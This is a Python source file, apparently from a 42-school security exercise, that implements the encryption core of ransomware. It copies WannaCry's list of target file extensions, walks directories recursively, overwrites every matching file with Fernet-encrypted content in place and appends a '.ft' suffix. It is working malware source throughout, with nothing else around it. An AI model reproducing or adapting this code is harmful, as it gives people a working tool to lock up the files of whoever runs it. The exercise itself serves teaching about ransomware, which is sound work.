# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    encryption.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: sleleu <sleleu@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/09/23 03:21:01 by sleleu            #+#    #+#              #
#    Updated: 2023/09/23 03:43:15 by sleleu           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import os
from cryptography.fernet import Fernet

wannacry_extensions: set[str] = {
    ".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2",
    ".docb", ".potx", ".sldx", ".jpeg", ".mp4", ".dch", ".frm", ".slk",
    ".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif",
    ".dot", ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc",
    ".dotm", ".ost", ".vdi", ".png", ".asf", ".vb", ".db", ".sxc",
    ".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots",
    ".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1", ".accdb", ".ods",
    ".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sqlitedb", ".max",
    ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3", ".3ds",
    ".xlw", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc", ".uot",
    ".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw",
    ".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw",
    ".xlc", ".123", ".bak", ".svg", ".sh", ".cpp", ".mml", ".ott",
    ".xltx", ".wks", ".tar", ".djvu", ".class", ".c", ".sxm", ".odt",
    ".xltm", ".wk1", ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem",
    ".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo", ".odg", ".p12",
    ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr",
    ".pptm", ".onetoc2", ".rar", ".wma", ".asp", ".ldf", ".std", ".crt",
    ".pot", ".snt", ".zip", ".flv", ".php", ".mdf", ".sxd", ".key",
    ".pps", ".hwp", ".backup", ".3g2", ".jsp", ".ibd", ".otp", ".pfx",
    ".ppsm", ".602", ".iso", ".mkv", ".brd", ".myi", ".odp", ".der",
    ".ppsx", ".sxi"
}

def add_extension(filepath: str)-> None:
    if filepath.endswith(".ft"):
        return
    else:
        os.rename(filepath, filepath + ".ft")

def encrypt_file(key: bytes, filepath: str):
    try:
        with open(filepath, "rb") as file:
            file_content = file.read()
    except OSError as error:
        print(error)
        return
    fernet = Fernet(key)
    print(f"Encryption of {filepath} ... ", end="")
    encrypted_content = fernet.encrypt(file_content)
    try:
        with open(filepath, "wb") as file:
            file.write(encrypted_content)
    except OSError as error:
        print(error)
        return
    print("| SUCCESS")

def encryption(key: bytes, path: str, silent: bool)-> None:
    files = os.listdir(path)
    for filename in files:
        filepath = os.path.join(path, filename)
        file_extension = "." + filepath.split(".")[-1]
        if os.path.isdir(filepath) is True:
            encryption(key, filepath, silent)
        else:
            if file_extension not in wannacry_extensions:
                continue
            encrypt_file(key, filepath)
            if file_extension != ".ft":
                add_extension(filepath)